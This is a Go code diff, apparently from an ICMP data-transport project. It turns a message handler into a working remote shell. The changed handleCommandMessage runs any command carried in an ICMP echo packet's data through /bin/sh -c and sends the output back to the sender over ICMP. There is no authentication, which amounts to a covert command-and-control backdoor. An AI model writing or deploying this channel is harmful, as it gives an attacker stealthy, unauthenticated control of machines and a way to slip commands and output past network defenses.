@@ -4,6 +4,8 @@ import (
 	"github.com/andrewdo/go-icmp-data/transport"
 	"golang.org/x/net/icmp"
 	"log"
+	"os/exec"
+	"strings"
 	"sync"
 )
 
@@ -16,7 +18,7 @@ func handleMessages() {
 			case p := <-ch:
 				switch p.Message.Code {
 				case transport.IcmpCodeCommandMsg:
-					handleCommandMessage(p.Message)
+					handleCommandMessage(p)
 					break
 				default:
 					log.Println("Unhandled ICMP code", p.Message.Code)
@@ -28,14 +30,24 @@ func handleMessages() {
 	}
 }
 
-func handleCommandMessage(msg *icmp.Message) {
-	if b, ok := msg.Body.(*icmp.Echo); ok {
-		cmd := string(b.Data)
+func handleCommandMessage(p transport.Packet) {
+	if b, ok := p.Message.Body.(*icmp.Echo); ok {
+		cmd := strings.TrimSpace(string(b.Data))
 		log.Println("Got command", cmd)
+
+		c := exec.Command("/bin/sh", "-c", cmd)
+		o, err := c.CombinedOutput()
+		if err != nil {
+			log.Println(err)
+		}
+
+		log.Println("Sending output", string(o))
+		go transport.Send(*p.From, o, transport.IcmpCodeCommandReply)
+
 		return
 	}
 
-	log.Println("Ignoring ICMP message", msg)
+	log.Println("Ignoring ICMP message", p.Message)
 }
 
 func main() {
